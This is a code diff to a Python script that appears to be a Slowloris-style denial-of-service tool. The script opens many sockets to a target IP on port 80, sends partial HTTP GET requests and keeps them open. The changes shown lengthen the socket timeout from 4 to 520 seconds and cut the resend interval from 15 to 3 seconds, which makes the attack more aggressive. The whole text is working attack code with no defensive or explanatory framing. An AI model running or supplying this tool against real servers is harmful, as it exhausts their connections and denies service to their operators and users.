@@ -11,7 +11,7 @@ sockets = []
 
 def setupSocket(ip):
     sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.settimeout(4)
+    sock.settimeout(520)
     sock.connect((ip, 80))
     sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 1557)).encode("utf-8"))
 
@@ -34,7 +34,7 @@ if __name__ == "__main__":
             print("Socket " + str(i))
             sock = setupSocket(ip)
         except socket.error:
-            print("error! socket doesn't connect")
+            print("error 520! socket doesn't connect")
             break
 
         sockets.append(sock)
@@ -55,8 +55,7 @@ if __name__ == "__main__":
                 if sock:
                     sockets.append(sock)
             except socket.error:
+                print("error 520! socket doesn't connect")
                 break
 
-        time.sleep(15)
-
-
+        time.sleep(3)
